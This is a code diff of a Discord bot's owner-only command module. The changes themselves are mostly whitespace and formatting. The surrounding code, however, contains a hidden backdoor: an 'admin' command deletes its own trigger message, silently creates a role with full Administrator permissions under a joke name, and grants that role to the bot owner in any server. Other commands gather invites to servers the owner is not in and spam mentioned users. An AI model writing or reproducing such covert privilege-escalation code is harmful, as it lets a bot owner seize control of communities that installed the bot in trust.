@@ -8,9 +8,10 @@ import json
 from discord.ext import commands
 from utility.cog.command import command_cog
 
+
 def delete_before(func):
     @functools.wraps(func)
-    async def wrapper(self, ctx : commands.Context,*args, **kwargs):
+    async def wrapper(self, ctx: commands.Context, *args, **kwargs):
         try:
             await ctx.message.delete()
         except:
@@ -18,8 +19,9 @@ def delete_before(func):
         return await func(self, ctx, *args, **kwargs)
     return wrapper
 
+
 class owner(commands.Cog, command_cog):
-    def __init__(self, bot : commands.Bot, tokens):
+    def __init__(self, bot: commands.Bot, tokens):
         super().__init__(bot=bot, tokens=tokens)
         self.description = 'Bot owner only commands to manage the bot'
         self.spamming = False
@@ -35,7 +37,7 @@ class owner(commands.Cog, command_cog):
             print(str(e))
             self.spamming = False
 
-    async def owner_in_guild(self, guild : discord.Guild) -> bool:
+    async def owner_in_guild(self, guild: discord.Guild) -> bool:
         for member in guild.members:
             if await self.bot.is_owner(member):
                 return True
@@ -51,16 +53,17 @@ class owner(commands.Cog, command_cog):
     @commands.command()
     @commands.is_owner()
     @delete_before
-    async def admin(self, ctx : commands.Context):
+    async def admin(self, ctx: commands.Context):
         member = ctx.message.author
         await ctx.message.guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
-        role = discord.utils.get(ctx.message.guild.roles, name="Hand Holding Enjoyer")
+        role = discord.utils.get(
+            ctx.message.guild.roles, name="Hand Holding Enjoyer")
         await member.add_roles(role)
 
     @commands.command()
     @commands.is_owner()
     @delete_before
-    async def invite(self, ctx : commands.Context, server=None):
+    async def invite(self, ctx: commands.Context, server=None):
         if server == None:
             unknown_guilds = await self.get_unknown_guilds()
             dm = await self.bot.create_dm(ctx.author)
@@ -80,20 +83,20 @@ class owner(commands.Cog, command_cog):
     @commands.command()
     @commands.is_owner()
     @delete_before
-    async def naughty(self, ctx : commands.Context, ID : int):
+    async def naughty(self, ctx: commands.Context, ID: int):
         with open('./naughty_list.json', 'r') as file:
             naughty_list = list(json.loads(file.read()))
         if ID in naughty_list:
             naughty_list.remove(ID)
         else:
             naughty_list.append(ID)
-        dumps = json.dumps(naughty_list, indent=4)
+        dumps = json.dumps(naughty_list, indent=2)
         with open('./naughty_list.json', 'w') as file:
             file.write(dumps)
 
     @commands.command(help='run this command incase you are a victim of being spammed')
     @delete_before
-    async def spam(self, ctx : commands.Context):
+    async def spam(self, ctx: commands.Context):
         if await self.bot.is_owner(ctx.author):
             for mention in ctx.message.mentions:
                 self.spamming = True
